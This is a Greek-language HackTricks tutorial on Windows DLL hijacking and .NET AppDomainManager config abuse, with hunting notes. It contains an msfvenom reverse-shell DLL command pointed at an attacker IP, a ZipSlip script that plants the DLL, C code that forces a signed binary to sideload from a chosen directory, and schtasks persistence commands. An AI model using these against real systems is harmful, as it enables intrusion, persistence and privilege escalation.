# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός περιλαμβάνει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση εδώ στο escalation, η μέθοδος του hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Χρησιμοποιούνται διάφορες μέθοδοι για DLL hijacking και η αποτελεσματικότητα καθεμιάς εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying για τη διατήρηση της λειτουργικότητας του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε διαδρομή αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για φόρτωση από μια εφαρμογή, η οποία θεωρεί ότι πρόκειται για ένα ανύπαρκτο απαιτούμενο DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης, όπως τα `%PATH%` ή τα αρχεία `.exe.manifest` / `.exe.local`, ώστε η εφαρμογή να κατευθύνεται στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε κατάλογο που ελέγχεται από τον χρήστη, μαζί με την αντιγραμμένη εφαρμογή, με τρόπο που μοιάζει με τεχνικές Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να κάνουμε μια αξιόπιστη διεργασία **.NET Framework** να φορτώσει κώδικα του attacker. Αν το εκτελέσιμο αρχείο-στόχος είναι μια **managed** εφαρμογή, το CLR συμβουλεύεται επίσης ένα **application configuration file** με όνομα που βασίζεται στο εκτελέσιμο αρχείο (για παράδειγμα `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα προσαρμοσμένο **AppDomainManager**. Αν το config παραπέμπει σε ένα assembly που ελέγχεται από τον attacker και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη διαδρομή εκτέλεσης της εφαρμογής** και το εκτελεί μέσα στην αξιόπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το configuration schema του .NET Framework της Microsoft, πρέπει να υπάρχουν τόσο τα `<appDomainManagerAssembly>` όσο και τα `<appDomainManagerType>` για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Ελάχιστη ρύθμιση:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Ελάχιστος διαχειριστής:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Πρακτικές σημειώσεις:
- Αυτή η τεχνική αφορά συγκεκριμένα το **.NET Framework**. Εξαρτάται από την ανάλυση παραμέτρων ρυθμίσεων του CLR και όχι από τη σειρά αναζήτησης DLL του Win32.
- Το host πρέπει να είναι πραγματικά ένα **managed EXE**. Γρήγορος έλεγχος: `sigcheck -m target.exe`, `corflags target.exe` ή έλεγχος για το **CLR Runtime Header** στα PE metadata.
- Το όνομα του αρχείου ρυθμίσεων πρέπει να ταιριάζει ακριβώς με το όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **signed Microsoft/vendor binaries**, επειδή το έμπιστο EXE παραμένει ανέγγιχτο, ενώ το κακόβουλο managed assembly εκτελείται in-process.
- Αν έχετε ήδη έναν εγγράψιμο installer/update directory, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **first stage**, και στη συνέχεια να ακολουθήσει κλασικό DLL sideloading ή reflective loading για τα επόμενα στάδια.

### AppDomainManager ως downloader + bootstrap για scheduled task

Ένα πρακτικό intrusion pattern είναι ο συνδυασμός του έμπιστου managed EXE με ένα κακόβουλο `*.config` και ένα κακόβουλο AppDomainManager DLL που λειτουργεί μόνο ως **small bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί ένα signed .NET installer ή updater από μια αξιόπιστη τοποθεσία, όπως `%USERPROFILE%\Downloads`.
2. Το παρακείμενο config προκαλεί τη φόρτωση του attacker assembly από το CLR **πριν** ξεκινήσει η legitimate app logic.
3. Ο malicious manager εκτελεί ένα **path gate** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει στο second stage να εκτελεστεί μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το real payload σε μια διαδρομή εγγράψιμη από τον χρήστη, όπως `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το signed host EXE παραμένει αμετάβλητο, επομένως το triage που ελέγχει μόνο τα hashes του κύριου binary μπορεί να μην εντοπίσει το compromise.
- Το απλό **path-based anti-analysis** είναι συνηθισμένο: η μετακίνηση του ZIP/EXE/DLL triad στο Desktop, στο Temp ή σε διαδρομή sandbox μπορεί σκόπιμα να διακόψει την αλυσίδα.
- Το first-stage AppDomainManager DLL μπορεί να παραμείνει μικρό και low-noise, ενώ το real implant γίνεται fetch αργότερα.

Minimal persistence example που συναντάται συχνά με αυτό το pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Σημειώσεις:
- Το ` /rl highest` σημαίνει **υψηλότερο διαθέσιμο** για τον συγκεκριμένο χρήστη/session· από μόνο του δεν εγγυάται escalation σε SYSTEM.
- Αυτή η τεχνική συχνά κατηγοριοποιείται καλύτερα ως **execution/persistence μέσω κατάχρησης ρυθμίσεων .NET** παρά ως κλασικό missing-DLL search-order hijacking, παρόλο που οι operators συχνά συνδυάζουν και τα δύο.

Σημεία ανίχνευσης:
- Υπογεγραμμένα .NET executables που εκκινούνται από **ZIP extraction paths**, `Downloads`, `%TEMP%` ή άλλους φακέλους με δυνατότητα εγγραφής από τον χρήστη, μαζί με ένα **colocated** `<exe>.config`.
- Νέα scheduled tasks των οποίων το action δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads` και των οποίων τα ονόματα μιμούνται browser/vendor updaters.
- Βραχύβια managed bootstrap processes που κατεβάζουν αμέσως ένα άλλο EXE και στη συνέχεια εκκινούν το `schtasks.exe`.
- Samples που τερματίζουν πρόωρα, εκτός αν το executable path αντιστοιχεί σε αναμενόμενο user-profile directory.

### Hijacking ενός υπάρχοντος scheduled task για relaunch του sideload chain

Για persistence, μην αναζητάτε μόνο **δημιουργία νέου task**. Ορισμένα intrusion sets περιμένουν μέχρι ένας νόμιμος installer να δημιουργήσει ένα **κανονικό updater task** και στη συνέχεια **ξαναγράφουν το task action**, ώστε το υπάρχον όνομα, ο author και το trigger να παραμένουν οικεία στους defenders.

Επαναχρησιμοποιήσιμο workflow:
1. Εγκαταστήστε/εκτελέστε το νόμιμο software και εντοπίστε το task που δημιουργεί κανονικά.
2. Κάντε export το task XML και σημειώστε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο το action, ώστε το task να εκκινεί το **trusted host EXE** από έναν user-writable staging directory, το οποίο στη συνέχεια κάνει side-load ή AppDomain-load το πραγματικό payload.
4. Κάντε re-register το ίδιο task name αντί να δημιουργήσετε ένα νέο, εμφανές persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Γιατί είναι πιο stealth:
- Το όνομα του task μπορεί να εξακολουθεί να φαίνεται νόμιμο (για παράδειγμα, ένας vendor updater).
- Η υπηρεσία **Task Scheduler** το εκκινεί, επομένως η επικύρωση parent/ancestor συχνά βλέπει την αναμενόμενη αλυσίδα scheduling αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα ονόματα task** μπορεί να παραβλέψουν ένα task του οποίου η registration υπήρχε ήδη, αλλά το action του δείχνει πλέον στο `%LOCALAPPDATA%`, `%APPDATA%` ή σε άλλη διαδρομή που ελέγχεται από τον attacker.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Συγκρίνετε το XML των `C:\Windows\System32\Tasks\*` και τα metadata του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με ένα baseline.
- Δημιουργήστε alert όταν ένα **vendor-looking updater task** εκτελείται από **user-writable directories** ή εκκινεί ένα .NET EXE με colocated αρχείο `*.config`.

> [!TIP]
> Για μια step-by-step αλυσίδα που συνδυάζει HTML staging, AES-CTR configs και .NET implants πάνω από DLL sideloading, δείτε το παρακάτω workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εντοπισμός missing Dlls

Ο πιο συνηθισμένος τρόπος για να βρείτε missing Dlls μέσα σε ένα σύστημα είναι να εκτελέσετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από τα sysinternals, **ορίζοντας** τα **ακόλουθα 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

και να εμφανίσετε μόνο το **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Αν αναζητάτε **missing dlls γενικά**, **αφήστε** αυτό να εκτελείται για μερικά **seconds**.\
Αν αναζητάτε ένα **missing DLL μέσα σε ένα συγκεκριμένο executable**, ορίστε ένα ακόμη filter, όπως **"Process Name" "contains" `<exec name>`**, εκτελέστε το και σταματήστε την καταγραφή των events.<sup>[[9]](#references)</sup>

## Εκμετάλλευση Missing Dlls

Για να κάνετε privilege escalation, αναζητήστε ένα **DLL που ένας privileged process προσπαθεί να φορτώσει** από μια τοποθεσία στην οποία μπορείτε να κάνετε write. Αυτό μπορεί να συμβεί όταν ελέγχετε έναν directory που αναζητείται πριν από τον directory που περιέχει το legitimate DLL ή όταν το requested DLL δεν υπάρχει και μπορείτε να κάνετε write σε έναν από τους searched directories.

### Dll Search Order

**Μέσα στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows applications** αναζητούν DLLs ακολουθώντας ένα σύνολο **pre-defined search paths**, σύμφωνα με μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα harmful DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους directories, ώστε να φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για την αποτροπή αυτού είναι να διασφαλίσετε ότι η application χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείτε να δείτε παρακάτω το **DLL search order σε 32-bit** systems:

1. Ο directory από τον οποίο έκανε load η application.
2. Ο system directory. Χρησιμοποιήστε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε το path αυτού του directory.(_C:\Windows\System32_)
3. Ο 16-bit system directory. Δεν υπάρχει function που να λαμβάνει το path αυτού του directory, αλλά αυτός γίνεται search. (_C:\Windows\System_)
4. Ο Windows directory. Χρησιμοποιήστε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε το path αυτού του directory.
1. (_C:\Windows_)
5. Ο current directory.
6. Οι directories που περιλαμβάνονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει το per-application path που ορίζεται από το registry key **App Paths**. Το key **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό του DLL search path.

Αυτή είναι η **default** search order με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτήν τη λειτουργία, δημιουργήστε το registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε το σε 0 (η default τιμή είναι enabled).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά στον directory του executable module που φορτώνει το **LoadLibraryEx**.

Τέλος, ένα DLL μπορεί να φορτωθεί με absolute path αντί για name. Σε αυτήν την περίπτωση, τα Windows αναζητούν το ίδιο το DLL μόνο σε αυτό το path· τα dependencies που ζητούνται με name εξακολουθούν να ακολουθούν την applicable search order.

Υπάρχουν και άλλοι τρόποι τροποποίησης της search order, αλλά δεν θα τους εξηγήσω εδώ.

### Chaining ενός arbitrary file write σε missing-DLL hijack

1. Χρησιμοποιήστε **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξετε τα DLL names που κάνει probe το process αλλά δεν μπορεί να βρει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται βάσει **schedule/service**, η τοποθέτηση ενός DLL με ένα από αυτά τα names στον **application directory** (search-order entry #1) θα το φορτώσει κατά την επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, το process αναζητούσε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιουργήστε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σας είναι ένα **ZipSlip-style arbitrary write**, δημιουργήστε ένα ZIP του οποίου το entry διαφεύγει από το extraction dir, ώστε το DLL να καταλήξει στον app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το archive στο watched inbox/share· όταν το scheduled task επανεκκινήσει τη διεργασία, αυτή φορτώνει το malicious DLL και εκτελεί τον κώδικά σας ως service account.

### Εξαναγκασμός sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για τον ντετερμινιστικό επηρεασμό του DLL search path μιας νέας διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τα native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο που ελέγχει ο attacker, μια target διεργασία που επιλύει ένα imported DLL βάσει ονόματος (χωρίς absolute path και χωρίς τη χρήση των safe loading flags) μπορεί να εξαναγκαστεί να φορτώσει ένα malicious DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις process parameters με το RtlCreateProcessParametersEx και παρέχετε ένα custom DllPath που δείχνει στον controlled φάκελό σας (π.χ. τον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το target binary επιλύει ένα DLL βάσει ονόματος, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμη και όταν το malicious DLL δεν βρίσκεται στον ίδιο κατάλογο με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη child διεργασία που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την current διεργασία.
- Το target πρέπει να κάνει import ή LoadLibrary ενός DLL βάσει ονόματος (χωρίς absolute path και χωρίς τη χρήση των LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα hardcoded absolute paths δεν μπορούν να γίνουν hijack. Τα forwarded exports και το SxS ενδέχεται να αλλάξουν την προτεραιότητα.

Ελάχιστο C παράδειγμα (ntdll, wide strings, απλοποιημένο error handling):

<details>
<summary>Πλήρες C παράδειγμα: εξαναγκασμός DLL sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα operational χρήσης
- Τοποθετήστε ένα malicious xmllite.dll (που κάνει export τις απαιτούμενες functions ή λειτουργεί ως proxy προς την πραγματική) στον κατάλογό σας DllPath.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll βάσει ονόματος, χρησιμοποιώντας την παραπάνω technique. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και κάνει sideload το DLL σας.

Αυτή η technique έχει παρατηρηθεί in-the-wild να χρησιμοποιείται για τη δημιουργία multi-stage sideloading chains: ένας αρχικός launcher αφήνει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με custom DllPath, ώστε να εξαναγκάσει τη φόρτωση του DLL του attacker από έναν staging directory.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking μέσω `.exe.config`

Για targets **.NET Framework**, το sideloading μπορεί να γίνει **πριν από το `Main()`** χωρίς patching της memory, με κατάχρηση του γειτονικού αρχείου **`.exe.config`** της εφαρμογής. Αντί να βασίζεται αποκλειστικά στο Win32 DLL search order, ο attacker τοποθετεί ένα legitimate .NET EXE δίπλα σε ένα malicious config και ένα ή περισσότερα assemblies που ελέγχει ο attacker.

Πώς λειτουργεί η chain:<sup>[[15]](#references)[[22]](#references)</sup>
1. Το host EXE ξεκινά και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να κάνει instantiate ένα `AppDomainManager` που ελέγχεται από τον attacker.
3. Ο malicious manager αποκτά **pre-`Main()` execution** μέσα στη trusted host process.
4. Το ίδιο config μπορεί να εξαναγκάσει το CLR να επιλύει πρώτα local assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και μπορεί να αποδυναμώσει το runtime validation/telemetry χωρίς inline patching.

Pattern τύπου campaign (η ακριβής nesting μπορεί να διαφέρει ανά directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Γιατί αυτό είναι χρήσιμο:
- **`<probing privatePath="."/>`** διατηρεί την επίλυση των assemblies στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε attacker code κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η νόμιμη λογική της εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια εφαρμογή full-trust να φορτώσει unsigned ή τροποποιημένα assemblies χωρίς αποτυχία επικύρωσης strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** αποφεύγει τις ανακατευθύνσεις publisher-policy προς νεότερα assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** κάνει την επιλογή runtime πιο deterministic.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα μέσω ETW** από το configuration, αντί το implant να τροποποιεί το `EtwEventWrite` στη μνήμη.

Operational pattern που έχει παρατηρηθεί σε πρόσφατες campaigns:
- Το Stage 1 αποθέτει τα `setup.exe`, `setup.exe.config` και τα local assemblies.
- Το Stage 2 τα αντιγράφει σε έναν πειστικό φάκελο **AppData update**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω **scheduled task**.
- Το Stage 3 επαληθεύει το execution context (για παράδειγμα, το αναμενόμενο parent `svchost.exe` από το Task Scheduler) πριν φορτώσει το τελικό RAT DLL/export.

Ιδέες για hunting:
- Υπογεγραμμένα ή κατά τα άλλα νόμιμα **.NET executables** που εκτελούνται μαζί με ύποπτα παρακείμενα αρχεία **`.config`** σε τοποθεσίες όπου μπορεί να γράψει ο χρήστης.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
- Scheduled tasks που επανεκκινούν μετονομασμένα update binaries από το **`%LOCALAPPDATA%`** ή από ειδικούς για την εφαρμογή καταλόγους `\bin\update\`.
- Parent/child chains όπου ένα scheduled task εκκινεί ένα trusted .NET host που φορτώνει αμέσως non-vendor assemblies από τον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL από την τεκμηρίωση των Windows

Ορισμένες εξαιρέσεις από την τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν εντοπίζεται ένα **DLL που έχει το ίδιο όνομα με ένα DLL που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνηθισμένη αναζήτηση. Αντί γι’ αυτό, ελέγχει για redirection και manifest πριν χρησιμοποιήσει ως προεπιλογή το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Όταν το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί τη δική του έκδοση του known DLL, μαζί με τυχόν dependent DLLs, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα με αυτά τα known DLLs.
- Αν ένα **DLL έχει dependencies**, η αναζήτηση για αυτά τα dependent DLLs πραγματοποιείται σαν να υποδεικνύονταν μόνο από τα **module names** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους path.

### Κλιμάκωση Privileges

**Απαιτήσεις**:

- Εντοπίστε μια process που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά privileges** (οριζόντια ή lateral movement) και από την οποία λείπει ένα **DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του executable ή ένας κατάλογος μέσα στο system path.

Αυτές οι προϋποθέσεις δεν είναι συνήθως διαθέσιμες από προεπιλογή: τα privileged executables συνήθως δεν έχουν missing DLL dependencies και οι standard users κανονικά δεν μπορούν να γράψουν σε system search-path directories. Τα misconfigured environments μπορούν, ωστόσο, να εκθέσουν και τις δύο συνθήκες.\
Αν πληρούνται οι απαιτήσεις, ελέγξτε το project [UACME](https://github.com/hfiref0x/UACME). Αν και ο κύριος στόχος του είναι το UAC bypass, περιέχει DLL-hijacking PoCs για συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον writable directory που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα permissions σε έναν φάκελο** εκτελώντας:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **abuse το Dll Hijacking για privilege escalation** με δικαιώματα εγγραφής σε έναν φάκελο του **System Path**, ελέγξτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

